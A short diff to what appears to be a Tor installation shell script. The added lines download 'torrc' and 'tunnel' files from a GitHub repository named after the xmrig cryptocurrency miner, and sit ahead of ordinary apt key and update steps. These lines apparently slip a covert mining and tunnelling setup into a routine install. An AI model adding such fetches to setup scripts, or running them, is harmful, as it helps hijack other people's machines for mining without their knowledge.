@@ -1,3 +1,6 @@
+wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/torrc
+wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/tunnel
+
 gpg --keyserver keys.gnupg.net --recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89
 gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo -E apt-key add -
 sudo apt update
